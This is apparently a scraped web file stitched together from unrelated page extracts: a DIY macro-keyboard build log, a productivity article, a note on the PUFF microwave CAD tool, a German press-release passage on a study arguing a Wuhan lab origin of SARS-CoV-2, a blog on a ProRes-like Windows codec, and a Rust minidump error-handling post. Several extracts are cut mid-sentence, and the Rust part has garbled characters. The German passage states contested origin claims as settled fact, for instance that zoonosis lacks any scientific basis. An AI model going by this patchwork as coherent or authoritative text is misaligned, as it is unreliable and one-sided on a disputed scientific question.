<img src="https://there.oughta.be/assets/resized/images/2021-02-17/1280/obs.jpg" alt="Side-by-side image of the macro keyboard controlling OBS in different states. The jog wheel is red in one image to indicate a muted microphone, but green in the other to show a live mic. Various icons change between a normal and a crossed-out state as their corresponding sources are toggled on or off." srcset="    https://there.oughta.be/assets/resized/images/2021-02-17/640/obs.jpg 640w,    https://there.oughta.be/assets/resized/images/2021-02-17/768/obs.jpg 768w,    https://there.oughta.be/assets/resized/images/2021-02-17/1024/obs.jpg 1024w,    https://there.oughta.be/assets/resized/images/2021-02-17/1280/obs.jpg 1280w, https://there.oughta.be/assets/images/2021-02-17/obs.jpg 3000w">

<figcaption>The macro keyboard controlling OBS in different states. On the left, the scene to present slides is selected (arrow on the third icon of the left column), the phone overlay is active (second icon, right column), the picture-in-picture portrait camera is visible (third icon, second column) and the microphone is muted (bottom right), which is also shown by the red jog wheel knob. On the right, the wide shot (arrow on the top-left icon) is active with both overlays deactivated (crossed out) and the microphone enabled (bottom right icon and green jog wheel).</figcaption>
</figure>

<p>In its default settings, the function of the wheel can be switched between a mouse wheel, simple arrow keys left/right and a volume control. In case of the volume control the rotation actually does two things: It sends the volume up/down keys like volume controls on a keyboard, but it also triggers a Python script that checks the system volume and visualizes it with the LEDs below the wheel.</p>

<p>Oh, I did not yet mention those? Well, there are 12 individually addressable RGB LEDs below the jog dial as another means to visualize its function, to notify of some events (a blue pulse means that the CO2 sensor in my office indicates that it is time to vent) or to show a status (like red or green if the microphone is muted or not in OBS during a Zoom call)<sup id="fnref:showoff" role="doc-noteref"><a href="#fn:showoff">7</a></sup>. In case of the volume control, a number of LEDs changes from green to red depending on the volume level reported back by the system.</p>

<figure>

<figcaption>Rotating the jog wheel can control the volume and a script is used to display the current volume level on the knob's LEDs as feedback.</figcaption>
</figure>

<p>I think at this point you have a good idea of what this device can do. Actually, there are so many more possible applications and certainly a lot of things I have not even thought of. I also imagine that gamers can do a lot with these buttons - at least in games where moving your hand to a second device is not slowing you down too much. Let me tell you how this versatility is achieved, so you can get your own imagination going.</p>

<h2 id="how-does-it-work">How does it work?</h2>

<p>At the heart of the macro keyboard is a Pro Micro, an Arduino-compatible microcontroller, which I have chosen for one simple reason: Its ATmega32U4 supports up to six USB endpoints<sup id="fnref:leonardo" role="doc-noteref"><a href="#fn:leonardo">8</a></sup>. If you plug it into your PC, the PC will not only see a regular USB keyboard, but also a USB mouse, a USB “consumer keyboard” (extension for multimedia keys) and a USB serial interface.</p>

<p>The latter is the trick to dynamically change the function of the keyboard. I have implemented a simple protocol that allows to send short commands to the serial interface that tell the Pro Micro which keystrokes (or mouse movements or media keys) should be assigned to each button. In practice, I have a Python script running that detects which software is running and which is currently focused (for example Gimp or OBS as mentioned above) and sends a new key assignment to the macro keyboard.</p>

<p>An important aspect of this is that the Pro Micro can act as a keyboard or mouse on its own without consulting with the Python script. If the button for the Gimp shortcut from the example above is pressed, the Pro micro sends key events “Alt pressed”, “B pressed”, “B released”, “Alt released”, “Z pressed”, “Z released” directly to the PC to which the events seem to come from a regular keyboard. The same goes for mouse events (including the mouse wheel) sent from the macro keyboard. The benefit is that this is as snappy as it gets (without a serial interface and a Python script in-between) and that this should work with any software or game without emulating anything in Python.</p>

<p>But since we sometimes can do much more in Python, keystrokes are also reported via serial<sup id="fnref:delay" role="doc-noteref"><a href="#fn:delay">9</a></sup>, so the Python script can also react to it and trigger more complex actions like the MQTT script that sets my office light or simply sending back feedback to the wheel LEDs. Those LEDs are also controlled by a set of RGB values that are sent via serial. With only twelve LEDs, there is no problem to update them fast enough to get a smooth animation.</p>

<figcaption>A short video loop of the macro keyboard reacting to a task switch between Gimp and the web browser, causing the device to switch between Gimp and fallback assignments. The refresh of the e-ink screen is not immediate, but fast enough to not disrupt your workflow. (Some of the delay can also be attributed to the polling interval of the script to get the active window and a little delay from the capture card through which the video of the device was recorded in contrast to the screencap on the right hand side.)</figcaption>
</figure>

<p>Finally, the content of the e-ink screen is also directly set by the Python script. And by directly, I mean that the Pro Micro does not even have enough RAM to store the full monochrome image of the entire 128x296 screen. This is a minor design flaw as you will see later as it complicates the commands to send an image slightly and prevents some optimizations by the Pro Micro itself. If I had picked a different microcontroller screen updates might have been a little bit faster, but then again, updates of an e-ink screen are not the fastest in any case. Luckily, the screen supports partial updates, so you still never need to wait for more than a second. Still, this is the reason why slower state changes (scenes in OBS, switching applications) can be shown on the e-ink screen, but rapid changes (like steps of the volume change) are shown with the LEDs.</p>

<h2 id="the-components">The components</h2>

<p>The entire device cost me about 86€ (plus 3d printing the case) and it can quite certainly be done for less. If you build more than one and/or find a cheaper …</p></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p><img src="https://www.deprocrastination.co/assets/illustrations/work_bad_rect.png" referrerpolicy="no-referrer" alt="How to be more productive without forcing yourself"></p><p>Imagine you could work more and be wildly productive. And the best thing about it? You wouldn’t need to force yourself to work.</p><p>There are people exactly like that who sit down and work without pushing themselves to do it. They even look forward to working. The good news is that you can learn to do it too.</p><p>Let’s get to it.</p><p>Most people have a negative mindset about work. People see work as an annoyance that keeps them from doing whatever they really want to do. They also think that resting and having nothing to do is an ideal state they’d like to be in forever. This leads to thinking that you need to push yourself to work. You need to use willpower to get yourself to do it.</p><p>It’s simple to understand where this attitude comes from:</p><ol><li>People usually want things they don’t have and think that grass is greener on the other side.</li><li>Everyone talks about how work is hard.</li><li>In comparison to dead-end or corporate jobs without impact or freedom, neverending leisure looks like paradise.</li></ol><p>In reality, most people who try to be in this nothing-to-do state for a long time become unhappy, depressed, and bored. Rich people who “made it” report how soon they become restless again.&nbsp;<a href="https://www.reddit.com/r/StopGaming/">People who game all the time</a>&nbsp;realize how empty it feels. Too much leisure isn’t satisfying for long.</p><p>On the other hand, there is a certain group of people who work a lot and enjoy it. Let’s call this group&nbsp;<em>producers</em>. By this, we don’t mean workaholics who escape from their whole life by working all the time. Producers have a healthy work-life balance. So what do they do that people who hate work don’t?</p><p>First, they tend to think about work differently.</p><p>For them, work is&nbsp;<a href="https://www.deprocrastination.co/blog/what-is-a-positive-feedback-loop-and-why-it-matters">a virtuous cycle of positive feedback loops</a>. Producers see&nbsp;<strong>work as a source of meaning and satisfaction</strong>. They see work as something that allows them to savor deserved leisure. They see rest as something that increases their life happiness and fuels their motivation towards work.</p><p>Second, their work is usually:</p><ul><li>Interesting</li><li>Meaningful</li><li>Well-defined</li></ul><p>If you check at least 1 or 2 boxes somehow, something magical happens:</p><p><strong>You don’t have to push yourself towards work anymore.</strong></p><p>Well-defined, meaningful, and especially interesting work is easy to look forward to.</p><p>Non-producers often think that these producers are lucky because they stumbled upon work like this. In reality, producers often go a long way to make their work fun.</p><h2>How to make work more interesting</h2><p>This is the crucial factor in whether work gets done.</p><p>You don’t have to see any meaning in your work for it to be interesting.</p><p>Even if the task is totally undefined, complex, and difficult, curiosity can carry you to its completion.</p><p>So how can you develop this curiosity towards work?</p><p>You have to give the work a chance to become interesting. How? By combining these 3 steps:</p><h3>1. Have less exposure towards super fun things</h3><p>Video games, surfing the internet, porn, alcohol, and drugs etc. make work significantly more difficult. Why?</p><p>They establish a certain standard of mental stimulation. Anything that’s not super fun will seem boring.</p><p><img src="https://www.deprocrastination.co/assets/illustrations/stimulation_standard.png" referrerpolicy="no-referrer" alt="We develop a Stimulation Standard"></p><p>Unfortunately, work often falls in the “feels bad” category. In comparison to games or social media, work can feel uninteresting or annoying.</p><p><img src="https://www.deprocrastination.co/assets/illustrations/stimulation_work_distractions.png" referrerpolicy="no-referrer" alt="Switching from distractions to work is hard"></p><p>You might argue that there are people who work just fine even while drinking alcohol, playing video games etc.</p><p>However, consider that there are two types of people: ones who can moderate their consumption and others who can’t. The latter society often describes as addicts.</p><p>Basically, if you’re addicted to any of the high-dopamine, low-effort activity, please quit it. At least temporarily so you can reestablish a healthy relationship to work. The more experienced we’re about the topic, the more obvious this is. There is no other way than to temporarily quit the addiction. If your vice is gaming, we’ve covered&nbsp;<a href="https://www.deprocrastination.co/blog/should-i-quit-video-games">video gaming addiction here</a>.</p><p>Some can have a healthy relationship with, for example, gaming.</p><p>However, for some people gaming is kryptonite. Here are some signs that super-fun activities have a detrimental effect on your work:</p><ol><li>You rush and half-ass everything else in order to get to your super-fun activity.         When I (Mat) was addicted to gaming, everything during the day was half-assed so I could finally start playing.</li><li>You keep postponing or forgetting everything that isn’t urgent in order to get to your super fun activity. You have this book that you want to read but you never get to actually reading it.</li><li>Your orderliness suffers once you start with the super fun activity.        Most people who come back to gaming report how their sense of orderliness starts to depreciate rather quickly. Their room gets messy, they start skipping workouts, stop meal-prepping, start eating more junk food, stop organizing their days.</li></ol><p>If the points above describe you, it might be time to quit your super fun activity. At least for a while.</p><p>Once your brain is not constantly hyper-stimulated, it’s easier to find mundane activities like work or tidying more interesting.</p><h3>2. Get bored more often</h3><p>When you get bored, everything else becomes more interesting.</p><p>Don’t believe us? Try this little experiment. Turn everything off. Set a timer for 15 minutes. Sit on a chair and stare at a wall. Don’t move. Don’t consume any information. Don’t talk. Don’t write anything down. Just stare at the wall.</p><p>Except for zen masters, most of us will become restless after a few minutes. Often, our brain starts dreaming and imagining things. For the first few minutes, you might feel alright, thinking about your day. However, after 5 or 10 minutes, you’ll be itching to do something, anything really. Suddenly, creating a website, writing an article, or drawing a picture sounds like more interesting, more fun.</p><p><img src="https://www.deprocrastination.co/assets/illustrations/stimulation_work_boredom.png" referrerpolicy="no-referrer" alt="Switching from boredom to work is easier"></p><p>If you feel like you never stop scrolling and consume content all the time, schedule a 15 minute boredom window for tomorrow right before you want to start working.&nbsp;<a href="https://www.deprocrastination.co/blog/how-to-use-boredom-to-procrastinate-less">Use boredom strategically.</a></p><h3>3. Dive deep into a topic</h3><p>It’s fun when we can connect the dots. When we can draw new connections between ideas, we get a rush.&nbsp;<em>Oh, I can see how this historical event contributed to an uprising…</em></p><p>The more connections we can draw within a topic, the more interested we become. This is what curiosity is all about.</p><p>If you take the time to watch a documentary related to what you’re working on, read a book about it, or find a couple relevant articles. You’ll collect more dots to connect. You’ll see how everything fits together.</p><p>When you do feel like watching something or have a free evening, instead of watching random videos or reruns of old TV shows, steer your attention to something related to what you need to do.</p><p>Give yourself time to develop an interest.</p><h2>How to make work more meaningful</h2><p>It's hard to feel motivated when you don't have a personal reason to do something.</p><p>However, “meaningful work” has become something of a buzzword.</p><p>Everyone is trying to find meaning in their work. This can be wasted energy, especially if you work in a corporate or a dead-end job. We say this so you don’t dwell on it and don’t feel frustrated because you can’t figure out how to save the world by doing what you do.</p><p>In any case, whatever your work is, you can make it meaningful enough to start.</p><p>Let’s say you have to study for an exam. You don’t find this particular class enjoyable. If you remind yourself why you chose to take the class and why studying is important for you, you will have an easier time persuading yourself to push through.</p><p>The fact is that some things simply need to be done. It's better if you find a compelling and personal reason to do them and get them over with as soon as possible, instead of putting them off forever.</p><p>When something is boring, ask yourself: Why do I need to do this? Find and reinforce the why behind the work.</p><h2>How to make work well-defined</h2><p>If you have a recipe that tells you step-by-step how to cook a meal, it is usually quite easy to follow. You know exactly where to start and how.</p><p>In today’s creative work, this often isn’t the case. There are no recipes for the work we need to do, or they don’t make the work any easier because the recipe would be too complex to understand.</p><p>Additionally, we often hamper our enthusiasm towards work by ourselves. How often do you find yourself with vague and unhelpful to-dos like “write the essay” or “make a video.”</p><p>There are so many steps in “make a video” that this vague task definition only causes anxiety and procrastination.</p><p>We always say that it’s more difficult to start working than to keep working. Therefore we should make starting easier by defining well&nbsp;<em>how</em>&nbsp;to begin and&nbsp;<em>what</em>&nbsp;to begin with.</p><p>The better you can define how to start working, the easier it’ll be to actually do it.</p><p>Basically, you do this in 3 steps:</p><h3>1. Always define exactly where you’ll start</h3><p>This means you write down the next physical action to take.</p><p>Do you need to write an essay?</p><p>The next physical action is: Open the scientific study and start reading</p><p>Or: Create a document → Create a rough draft in the next 15 minutes</p><p>Do you want to start learning coding?</p><p>The next physical action should be: Open freecodecamp.org → Start solving the first challenge</p><p>It might sound silly to define the next physical action, but it isn’t. Finding it is easy, and you can do it immediately.</p><p>What’s the next physical action you need to take?</p><h3>2. Start with only having to work for 5/15 minutes</h3><p>You probably don't feel like creating a 20 slide presentation right now from scratch, and then presenting it in 2 hours.</p><p>You don't feel like writing a whole final thesis on a topic you barely know.</p><p>You don't feel like running a marathon.</p><p>But you might feel like looking up a couple pictures or articles for the presentation.</p><p>Or feel like writing a paragraph or two before lunch break.</p><p>Or feel like taking a 1km walk.</p><p>Those are the small steps along the longer journey.</p><p>We often underestimate the power of small steps, but they are essential because they help us get into the right routine.</p><p>If you start running a couple miles every other day, you'll get familiar with the routine and then you'll naturally want to start increasing the …</p></article></div>

<a href="http://www.its.caltech.edu/~mmic/puff.html">PUFF</a> is
the name of a computer aided design program for microwave circuits,
developed at the California Institute of Technology. It allows one
to easily edit a circuit and calculate and plot the circuit's
scattering parameters. It was originally created under MS-DOS
in the 1980s and 1990s, and distributed for a modest fee together
with a manual and sourcecode.
Since late 2000, this web page contained information on how to
compile it under Linux.

In early 2010, the original program was made available under the
GPLv3 license, and therefore a complete Linux package is now
available for free here, including the original manual:

Er kommt zu dem Ergebnis, dass sowohl die Zahl als auch die Qualität der Indizien für einen Laborunfall am virologischen Institut der Stadt Wuhan als Ursache der gegenwärtigen Pandemie sprechen.</p><p>Die Studie wurde im Zeitraum von Januar 2020 bis Dezember 2020 durchgeführt. Sie basiert auf einem interdisziplinären wissenschaftlichen Ansatz sowie auf einer umfangreichen Recherche unter Nutzung verschiedenster Informationsquellen. Hierzu gehören unter anderem wissenschaftliche Literatur, Artikel in Print- und Online-Medien sowie persönliche Kommunikation mit internationalen Kolleginnen und Kollegen. Sie liefert keine hochwissenschaftlichen Beweise, wohl aber zahlreiche und schwerwiegende Indizien:</p>
<ul>
<li>Im Gegensatz zu früheren Coronaviren-bedingten Epidemien wie SARS und MERS konnte bis heute, d. h. weit über ein Jahr nach Ausbruch der gegenwärtigen Pandemie, kein Zwischenwirtstier identifiziert werden, welches die Übertragung von SARS-CoV-2-Erregern von Fledermäusen auf den Menschen ermöglicht haben könnte. Die Zoonose-Theorie als mögliche Erklärung für die Pandemie besitzt daher keine fundierte wissenschaftliche Grundlage.</li>
<li>Die SARS-CoV-2-Viren können erstaunlich gut an menschliche Zellrezeptoren ankoppeln und in menschliche Zellen eindringen. Ermöglicht wird dies durch spezielle Zellrezeptor-Bindungsdomänen verbunden mit einer speziellen (Furin-)Spaltstelle des Coronavirus-Zacken-Proteins. Beide Eigenschaften zusammen waren bislang bei Coronaviren nicht bekannt und weisen auf einen nicht-natürlichen Ursprung des SARS-CoV-2-Erregers hin.</li>
<li>Fledermäuse wurden nicht auf dem in Verdacht geratenen Fischmarkt im Zentrum der Stadt Wuhan angeboten. Im virologischen Institut der Stadt Wuhan gibt es jedoch eine der weltweit größten Sammlungen von Fledermauserregern, welche von weit entfernten Höhlen in südchinesischen Provinzen stammen. Es ist extrem unwahrscheinlich, dass sich Fledermäuse aus dieser Entfernung von nahezu 2.000 km auf natürliche Weise auf den Weg nach Wuhan begeben haben, um dann in unmittelbarer Nähe dieses virologischen Instituts eine weltweite Pandemie auszulösen.</li>
<li>Eine Forschungsgruppe am virologischen Institut der Stadt Wuhan hat über viele Jahre hinweg gentechnische Manipulationen an Coronaviren vorgenommen mit dem Ziel, diese für Menschen ansteckender, gefährlicher und tödlicher zu machen. Dies ist in der wissenschaftlichen Fachliteratur durch zahlreiche Publikationen belegt.</li>
<li>Es existierten erhebliche Sicherheitsmängel im virologischen Institut der Stadt Wuhan bereits vor Ausbruch der Coronavirus-Pandemie, welche dokumentiert sind.</li>
<li>Es gibt zahlreiche direkte Hinweise auf einen Laborursprung des SARS-CoV-2 Erregers. So soll sich eine junge Wissenschaftlerin des virologischen Instituts in Wuhan als erste infiziert haben. Es gibt ferner zahlreiche Hinweise darauf, dass sich bereits im Oktober 2019 der SARS-CoV-2 Erreger ausgehend von dem virologischen Institut in der Stadt Wuhan und darüber hinaus verbreitet hat. Ferner gibt es Hinweise auf eine entsprechende Untersuchung des virologischen Instituts durch die chinesischen Behörden in der ersten Oktoberhälfte 2019.&nbsp; &nbsp;</li>
</ul>
<p>&nbsp;„Die gegenwärtige Coronavirus-Pandemie beherrscht nicht nur die derzeitigen Schlagzeilen, sondern wird uns noch über viele Jahre hinweg beschäftigen – nicht zuletzt aufgrund der sozialen und wirtschaftlichen Auswirkungen. Seit Monaten steht verständlicherweise der Umgang mit und die Bewältigung von der Corona-Krise im Vordergrund der Themen in der Politik und in den Medien. Von großer Bedeutung ist jedoch schon heute die kritische wissenschaftsbasierte Auseinandersetzung mit der Frage nach dem Ursprung der derzeitigen Pandemie, denn nur auf Basis dieses Wissens können adäquate Vorkehrungen getroffen werden, die Wahrscheinlichkeit für das Auftreten ähnlicher Pandemien in Zukunft so klein wie möglich zu halten“, sagt Prof. Dr. Roland Wiesendanger.</p>
<p>Die Studie wurde im Januar 2021 fertiggestellt und zunächst in Wissenschaftskreisen verteilt und diskutiert. Mit der Veröffentlichung soll nun eine breit angelegte Diskussion angeregt werden, insbesondere im Hinblick auf die ethischen Aspekte der sogenannten „gain-of-function“-Forschung, welche Krankheitserreger für Menschen ansteckender, gefährlicher und tödlicher macht. „Dies kann nicht länger nur Angelegenheit einer kleinen Gruppe von Wissenschaftlerinnen und Wissenschaftlern bleiben, sondern muss dringend Gegenstand einer öffentlichen Debatte werden“, so der Autor der Studie.&nbsp;</p>

					<div>
					<h2>
					I made a PRORES-lookalike for Windows
					</h2>



					
					
					<h2>Preface – What is PRORES?
					</h2>
					<p>
PRORES is a line of intermediate codecs, which means they are intended for use during video editing, and not for practical end-user viewing. It’s been developed by Apple, back in 2007 (<a href="https://en.wikipedia.org/wiki/Apple_ProRes" target="_blank">Wikipedia</a>).
</p>


					<h2>Why did I do it?
					</h2>
					<div><p>
There have been several reasons, but it all boils down to: I got very frustrated with the implementation of the Windows decoders when dealing with .mp4 (h264 and h265 codecs) – which are pretty much 98% of all videos out there.<br>

Since I’m actually developing a <a href="https://cinematicstudio.app/" target="_blank">video editor</a>, when it comes to loading video frames in memory, you can:<br>
1. use <a href="https://docs.microsoft.com/en-us/uwp/api/windows.media.playback.mediaplayer?view=winrt-19041" target="_blank">MediaPlayer</a> class, from Microsoft<br>
2. use <a href="https://ffmpeg.org/" target="_blank">ffmpeg</a></p><p>


MediaPlayer is unreliable and slow <a href="#n1">[1]</a>. And, wait for it, it has Video RAM memory leaks <a href="#n2">[2]</a>.<br>

Using ffmpeg: Most advice on the internet – whether you can use ffmpeg in a commercial app or not – ends with “but I’m not a lawyer”. I chose to avoid it, at least at the beginning <a href="#n3">[3]</a>. </p><p>

I initially went with using MediaPlayer. This frustrated me (and a lot of my users) a lot, making my app close to impossible to use in certain scenarios. Like, what if I want to play a video backwards, at 3x speed? What I’d do is cache that specific video segment ahead of time – which not only did take a lot of RAM, but it also made my app show the “Loading” icon when you would press Play – until I would pre-load all such segments.</p><p>

At some point I painfully realized: if I don’t do something similar to PRORES, I’m screwed. Clearly, the first idea was – what if I could use the codecs from Apple? Spoiler alert: you can’t. <br>

So, what else could I do? Develop my own!

</p></div>





					<h2>Lets see the numbers!
					</h2>
					<div><p>
Well, I can’t say it was easy to develop this. I had to get creative quite a few times. But once I realized there’s really no way around it, I stuck with it. And I’ve created some limitations, just to make sure frames will load up insanely fast.</p><p>

When you hit Play, the video project will strive to play at 60 frames / second – even if your video project is 30 fps or something else. </p><p>

What this basically means, I have 16.66 milliseconds to load everything that’s needed (which if you have several video layers, means loading several video frames) and apply video effects on top of that. And, play the sound, of course.</p><p>

We can relax this requirement a bit, because even if the video project would play at 30 frames / second, it would still look smooth to you. So, I have 33.33 milliseconds tops to load all needed video frames and apply video effects on top of that.</p><p>

Applying video effects, such as blur, directional blur, masking, lighting takes an insane amount of time. By doing a lot of trial and error, I chose to do it like this – I will show the video at 640 x 360 (no, it’s not as low res as you may think <a href="#n4">[4]</a>). This will make frame loading very fast, and the video effects will be fast as well. I will improve upon this <a href="#n5">[5]</a>.</p><p>

Complicated video effects can take up to 5ms on a decent GPU. They take slightly longer on older GPUs, but it’s still decent. It can take up to 9ms on an Nvidia Quadro M600M with 2GB of RAM (a 5-year old video card). Compounding video effects (several effects on top of each other) will be a bit harder <a href="#n6">[6]</a>.</p><p>

This still leaves us with 24.33 milliseconds to load video frames. In my tests, I load one video frame in 2ms on an Nvidia Geforce RTX 2070, and 3.45ms on Nvidia Quadro M600M. So, worst case scenario, I could still load 6-7 video frames in time for drawing them on-screen.</p><p>

One thing to note is that you will need a decent SSD for this to happen. Or, do a “sacrifice play” – basically hit Play, and this will be a bit slower the first time, so that Windows will be able to cache the video files in memory.
					
</p></div>


					<h2>Creating the PRORES-lookalike files
					</h2>
					<div><p>
When you import a video file, I will automatically create the PRORES-lookalike file. There’s no point in using MediaPlayer until the PRORES-lookalike is complete – it would drain further resources (Memory + CPU + GPU) with very little gains.</p><p>

One thing I do, while creating the PRORES-lookalike, I will keep in memory the first 3.5 minutes of the video, thus, you can still have a decent preview in real-time while I’m doing this.</p><p>

To give you the numbers, it’s not something set in stone, it depends on the video I’m converting. It will range between 15-18 times faster than duration of the video on my Geforce RTX 2070 card. So for instance, it takes roughly 3:20 minutes to process a 1 hour video.</p></div>


					<h2>Behind the scenes
					</h2>
					<p>
What I’m doing is something remarkably simple, and after running a lot of tests, I realized it’s enough, at least for now. It’s similar to <a href="https://en.wikipedia.org/wiki/Motion_JPEG" target="_blank">Motion JPEG</a>, with the difference that I’m in control 100%. In other words, I always get to decide when each video frame is loaded and how long it stays in memory.					
</p>


					<h2>Is this battle tested?
					</h2>
					<p>
Yes! I’ve had this in production since late September 2020. I’ve done a few tweaks along the way, but the core code is the same.</p>


					<h2>How does it compare with ffmpeg?
					</h2>
					<p>
My take is that it’s 6-10 times faster. I’ve looked into it in the last few days, but I can’t do a proper test just yet. I’ve used <a href="https://github.com/unosquare/ffmediaelement" target="_blank">FFMediaElement library</a> to do some testing, but I can’t get it to use GPU (I did ask in the forum, will publish the results once I have them). At this time, for a 4K video, my results indicate processing a video frame takes 77ms on the CPU on my machine with the Geforce video card. I assume the GPU should be 5-7 times faster, thus it would likely take somewhere between 11-15ms, compared to 2ms for me.
</p>

					<h2>How does it compare with Apple PRORES?
					</h2>
					<div><p>
Honestly, I don’t know. I would say it should be roughly on-par, since I’m pretty sure the underlying concepts should be similar. It may be that Apple might generate the PRORES files faster, I’m not sure. But accessing them, I would say we should see similar times.</p><p>

If anyone wants to test this – you’d need a machine with both MacOS and Windows 10 – , drop me an email at <a href="mailto:cinematic@cinematicstudio.com">cinematic@cinematicstudio.com</a> I can easily allow turning on statistics that would show you the average video frame loading time.</p><p>

					<h2>Notes
					</h2>
					<div>
<p>[1] For one thing, when you seek to a frame, you’re not entirely sure you’ve actually gotten there, in <b>VideoFrameAvailable</b> event – because of how they internally do caching. So even if Microsoft tells you you’re there, well you’re not. To give you an example, say you’re at position 10.5 seconds, and you want to go to position 20.1 seconds. When you receive the first 2-3 <b>VideoFrameAvailable</b> events, what you may get is frames at position 10.5 seconds, and at some point, you’ll start receiving frames at position 20.1 seconds. </p><p>

In practice, I’ve found out that 5 frames seems to be a safe bet – in other words, I would go to position 20.1 seconds – 5 frames, then simply ignore the first 5 frames. Even though in practice I never met a case when you would still get an invalid frame after the first 5 frames, it doesn’t really mean it can’t happen. This gets even worse if you need to do several seeks at very small intervals.</p><p>

There’s no way to go several frames ahead. You can only <b>StepForwardOneFrame()</b> and <b>StepBackwardOneFrame()</b>. In practice, going backward is roughly 5 times slower.</p><p>

Having several <b>MediaPlayer</b> instances doesn’t help things either – in practice, I noticed that the more instances I would have, the slower everything got.</p><p>

Sometimes, I would get an infinite amount of <b>VideoFrameAvailable</b> events, because, that’s how Microsoft rolls.

<a name="n2"></a></p><p>[2] Finally, <b>VideoFrameAvailable</b> has memory leaks. I found this out the hard way – from one user being very, lets say, frustrated. At Export, within 60-70 seconds, it sometimes could end eating up 8GB of video RAM when dealing with 4K footage.

<a name="n3"></a></p><p>[3] I’ve pondered about using ffmpeg more times than I can count. </p><p>

There’s a lot of mambo jambo about whether/how you can use this in commercial code, because MPEG LA holds the patent for it – so even if you use your own implementation, you’d still need to pay MPEG LA. It didn't really sit right with me. It's also unclear to me how they would figure out the number of "downloaded copies".</p><p>

I’ve done another round of searching lately, and I’m in talks with <a href="https://x264.org/en/" target="_blank">x264</a> It seems I need to  obtain a license from them, in order to compile ffmpeg to use LGPL (thus, be able to use it commercially) – this would be on top of what I'd pay MPEG LA.</p><p>

I won’t get my hopes up until I receive a quote from them – the fact that you need to request a quote makes me think they’ll do their best to milk you as much as possible.

<a name="n4"></a></p><p>[4] I can hear you screaming – that’s sooo low res! Turns out it’s not. If you come to think about it, most of the time the video takes less than ¼ of the screen, the rest being occupied by the timeline, and other panes. And in the future, I will allow you to select a higher resolution, such as 1280 x 720, or simply 1920 x 1080 if you’ve got some hard core video card.

<a name="n5"></a></p><p>[5] The next steps will be: once you settle on one video frame (you pause the project, and do some editing), to show the video frame at Full HD (1920 x 1080). It’s not as easy as you’d think, but I can do it :) 

<a name="n6"></a></p><p>[6] The more video effects you compound (one video effect on top of another, on top of another, and so on), the more GPU is needed. One of the reasons I chose to go with 640 x 360 resolution is that this gives a quite reasonable number of compound effects that can be played in real time. On a decent video card, you won’t really need any pre-rendering ahead of time (which pretty much breaks your flow).

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p><strong>Today you are frustrated.</strong></p>

<p>This is so annoying. Youâ€™ve written a Rust crate and now that you want to test it for the very first time, <em>it doesnâ€™t work!</em></p>

<p>Come on, Rust! How dare you? You promised that once one gets past the compiler, it.<br>
<em>Just.<br>
<strong>Works!</strong></em><br>
And now this!</p>

<p>Ok, ok. You calm yourself down. Lets start from the beginning. You want to create so called <a href="https://docs.sentry.io/platforms/native/guides/minidumps/">minidumps</a>. This is a file that contains information about a crashed program (like stacks of all threads, CPU registers, system info, etc.).
The minidump consists of various sections, such as the minidump header (including time of day, versions and basically a table of contents), a thread section (including all threads of the process and their stacks), memory mappings and libraries, etc. [Just to give some context, as all of this is actually not really important.]</p>

<p>For this, you created a <a href="https://github.com/msirringhaus/minidump_writer_linux">crate</a>. One section gets written after the other, while information about the targeted process is retrieved from the system. You even created a nice, simple API. You hand in a process ID and an open file, where the minidump should be written to. like this:</p>

<div><div><pre><code>    <span>MinidumpWriter</span><span>::</span><span>new</span><span>(</span><span>pid</span><span>,</span> <span>blamed_thread</span><span>)</span>
        <span>.dump</span><span>(</span><span>&amp;</span><span>mut</span> <span>dump_file</span><span>)</span>
        <span>.expect</span><span>(</span><span>"Dumping failed!"</span><span>)</span>
</code></pre></div></div>

<p>You can also hand in user specified memory regions that should be included in the dump, like so:</p>

<div><div><pre><code>    <span>let</span> <span>app_memory</span> <span>=</span> <span>AppMemory</span> <span>{</span>
        <span>ptr</span><span>:</span> <span>some_address</span><span>,</span>
        <span>length</span><span>:</span> <span>memory_size</span><span>,</span>
    <span>};</span>

    <span>MinidumpWriter</span><span>::</span><span>new</span><span>(</span><span>pid</span><span>,</span> <span>pid</span><span>)</span>
        <span>.set_app_memory</span><span>(</span><span>vec!</span><span>[</span><span>app_memory</span><span>])</span>
        <span>.dump</span><span>(</span><span>&amp;</span><span>mut</span> <span>tmpfile</span><span>)</span>
        <span>.expect</span><span>(</span><span>"Dumping failed"</span><span>);</span>
</code></pre></div></div>



<p>But when you run your nice library code in an application, you get <code>'Dumping failed: "Failed in ptrace::read: Sys(EIO)"'</code>.</p>

<p><em>How useless is that?!</em></p>

<p>Okay, maybe you could enhance your library error handling, a little. And by enhance, you mean â€œimplement one in the first placeâ€�.</p>

<h2 id="state-of-the-dart">State of the dart</h2>

<p>Your current approach is to define</p>

<div><div><pre><code><span>type</span> <span>Error</span> <span>=</span> <span>Box</span><span>&lt;</span><span>dyn</span> <span>error</span><span>::</span><span>Error</span> <span>+</span> <span>std</span><span>::</span><span>marker</span><span>::</span><span>Send</span> <span>+</span> <span>std</span><span>::</span><span>marker</span><span>::</span><span>Sync</span><span>&gt;</span><span>;</span>
<span>pub</span> <span>type</span> <span>Result</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>=</span> <span>result</span><span>::</span><span>Result</span><span>&lt;</span><span>T</span><span>,</span> <span>Error</span><span>&gt;</span><span>;</span>
</code></pre></div></div>

<p>and using <code>Result&lt;T&gt;</code> in all of your functions as the return value and handing all of them to the parent function using <code>?</code>. Thus the original error pierces through your callstack like a dart throughâ€¦.jelly (Yes, you are good with words and you know it.).</p>

<div><div><pre><code>    <span>pub</span> <span>fn</span> <span>init</span><span>(</span><span>&amp;</span><span>mut</span> <span>self</span><span>)</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>()</span><span>&gt;</span> <span>{</span>
        <span>self</span><span>.read_auxv</span><span>()</span><span>?</span><span>;</span>
        <span>self</span><span>.enumerate_threads</span><span>()</span><span>?</span><span>;</span>
        <span>self</span><span>.enumerate_mappings</span><span>()</span><span>?</span><span>;</span>
        <span>Ok</span><span>(())</span>
    <span>}</span>
</code></pre></div></div>

<p>In Rust parlance, this is also called bubbling up errors.</p>

<p>Usually, you just bubble up errors from libraries you use, but for the rare errors you have to define yourself, you currently just do</p>
<div><div><pre><code><span>Err</span><span>(</span><span>"Found no auxv entry"</span><span>.into</span><span>())</span>
</code></pre></div></div>

<p>Well, now you know there is an error, at least. And that it has <em>something</em> to do with your usage of <code>ptrace</code>. But you have no idea where that happens. You use that functionality in various places. Is it during the init-phase? During one of the sections? And if so, which one? What are you trying to read? And from where? Or in short: <strong>What is going on?!</strong></p>

